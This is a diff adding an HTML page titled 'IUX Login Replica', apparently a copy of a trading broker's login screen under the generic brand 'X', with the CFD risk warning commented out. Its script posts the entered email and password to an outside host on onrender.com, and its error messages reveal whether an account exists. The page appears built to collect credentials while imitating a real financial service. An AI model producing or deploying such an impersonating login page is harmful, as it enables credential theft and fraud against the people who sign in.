@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IUX Login Replica</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<style>
+* {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+body {background:#0b0f12;color:#fff;}
+.risk-bar {background:#000;color:#9aa4af;font-size:13px;text-align:center;padding:10px 20px;}
+.header {display:flex;justify-content:space-between;align-items:center;padding:25px 50px;}
+.logo {font-size:28px;font-weight:600;color:#18e09b;}
+.lang {font-size:14px;color:#ccc;}
+.wrapper {height:calc(100vh - 140px);display:flex;justify-content:center;align-items:center;}
+.card {width:460px;background:#0f1418;border:1px solid #1f2a30;border-radius:20px;padding:40px;}
+.card h2 {text-align:center;font-weight:600;margin-bottom:15px;}
+.card p.subtitle {text-align:center;color:#9aa4af;font-size:14px;margin-bottom:30px;}
+label {font-size:14px;color:#9aa4af;}
+select,input {width:100%;margin-top:8px;margin-bottom:20px;padding:14px;background:#11161a;border:1px solid #2a363d;border-radius:10px;color:#fff;font-size:14px;}
+button.primary {width:100%;padding:14px;border-radius:10px;border:none;background:#18e09b;font-weight:600;cursor:pointer;transition:0.3s;}
+button.primary:hover {background:#12c884;}
+.divider {text-align:center;margin:20px 0;color:#666;font-size:14px;}
+.social-btn {width:100%;padding:14px;border-radius:10px;border:1px solid #2a363d;background:transparent;color:#fff;margin-bottom:12px;cursor:pointer;}
+@media(max-width:600px){.card{width:90%;padding:30px;}}
+</style>
+</head>
+
+<body>
+
+<!-- <div class="risk-bar">
+CFDs are complex instruments and come with a high risk of losing money rapidly due to leverage.
+</div> -->
+
+<div class="header">
+    <div class="logo">X</div>
+    <div class="lang">🌐 EN</div>
+</div>
+
+<div class="wrapper">
+
+<div class="card">
+    <h2>Login to Your Account</h2>
+    <p class="subtitle">Enter your registered email and password</p>
+
+    <label>Email</label>
+    <input type="email" id="loginEmail" placeholder="example@email.com">
+
+    <label>Password</label>
+    <input type="password" id="loginPassword">
+
+    <button class="primary" id="loginBtn" onclick="submitLogin()">Login</button>
+
+    <p class="divider">or</p>
+
+   <button class="social-btn" onclick="window.location.href='/register'">Sign Up</button>
+    <!-- <button class="social-btn">Login with Facebook</button> -->
+</div>
+
+</div>
+
+<footer style="text-align:center;padding:20px 0;background:#0b0f12;color:#888;font-size:13px;margin-top:30px;">
+    © 2026 X Platform. All rights reserved. | <span style="color:#18e09b;cursor:pointer;"><a href="/privacy-policy">Privacy Policy</a> </span> | <span style="color:#18e09b;cursor:pointer;"><a href="/trading-fees"></a>Terms of Service</span>
+</footer>
+
+<script>
+function blurrLogin(){
+    $('#loginBtn').css("opacity","0.6").text("Loading...");
+}
+function redLogin(){
+    $('#loginBtn').css("opacity","1").text("Login");
+}
+
+async function submitLogin(){
+    const email = $('#loginEmail').val();
+    const password = $('#loginPassword').val();
+
+    if(!email || !password) return alert("Enter email and password");
+
+    blurrLogin();
+
+    await $.ajax({
+        type:"POST",
+        url:"https://vantage-render.onrender.com/auth/login",
+        dataType:"json",
+        data:{ email,password },
+        success:function(data){
+            redLogin();
+            const user = Object.assign({}, data.data);
+            // never keep credentials/one-time codes in localStorage
+            delete user.password;
+            delete user.otp;
+            delete user.otpExpiration;
+
+            // clear any previous session first
+            localStorage.removeItem("userData");
+            localStorage.removeItem("user");
+            localStorage.removeItem("adminToken");
+
+            Swal.fire({icon:'success',text:'Login successful!'});
+            setTimeout(() => {
+                // The server only returns a token for accounts with isAdmin: true
+                if (user.isAdmin && data.token) {
+                    localStorage.setItem("adminToken", data.token);
+                    localStorage.setItem("user", JSON.stringify(user));
+                    $(location).prop('href', '/admin');
+                } else {
+                    localStorage.setItem("userData", JSON.stringify(user));
+                    $(location).prop('href', '/');
+                }
+            }, 2000);
+        },
+        error:function(xhr){
+            redLogin();
+            const msg = xhr.status === 404 ? 'No account found with that email'
+                      : xhr.status === 502 ? 'Incorrect email or password'
+                      : 'Login failed';
+            Swal.fire({icon:'error',text:msg});
+        }
+    });
+}
+</script>
+
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'b1ee30112d1af43d44051608bfae7ce928134fdb';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+
+</body>
+
+</html>
